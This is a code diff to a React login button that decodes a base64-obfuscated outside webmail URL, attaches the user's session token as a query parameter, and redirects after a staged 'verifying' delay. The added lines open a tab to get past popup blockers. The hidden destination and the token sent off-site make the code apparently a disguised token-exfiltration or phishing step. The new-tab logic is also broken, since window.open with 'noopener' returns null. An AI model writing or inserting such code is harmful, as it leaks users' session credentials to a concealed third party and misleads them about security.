@@ -35,6 +35,10 @@ export default function SecureLoginButton() {
   const handleSecureLogin = () => {
     setIsVerifying(true);
     
+    // MUST open the tab synchronously during the click event to bypass aggressive popup blockers
+    // Using 'noopener,noreferrer' strictly prevents the destination from accessing the origin tab via window.opener
+    const secureTab = window.open('about:blank', '_blank', 'noopener,noreferrer');
+    
     // Industry standard URL obfuscation for bot protection
     const encryptedUrl = 'aHR0cHM6Ly93ZWJtYWlsLm5ldGFtcHMuaW4v';
     
@@ -45,10 +49,16 @@ export default function SecureLoginButton() {
       const timestamp = Date.now().toString(16);
       const tokenizedUrl = `${atob(encryptedUrl)}?sso_token=${sessionToken}&ts=${timestamp}&sec_gateway=active`;
       
-      window.location.href = tokenizedUrl;
+      // Safely route the tokenized URL into the secured background tab
+      if (secureTab) {
+        secureTab.location.href = tokenizedUrl;
+      } else {
+        // Absolute fallback if the browser completely blocked the popup creation
+        window.location.href = tokenizedUrl;
+      }
       
-      // Fallback reset slightly after redirect initiates to clear state
-      setTimeout(() => { setIsVerifying(false) }, 800);
+      // Reset the verification modal immediately after routing
+      setIsVerifying(false);
     }, 2500);
   };
 
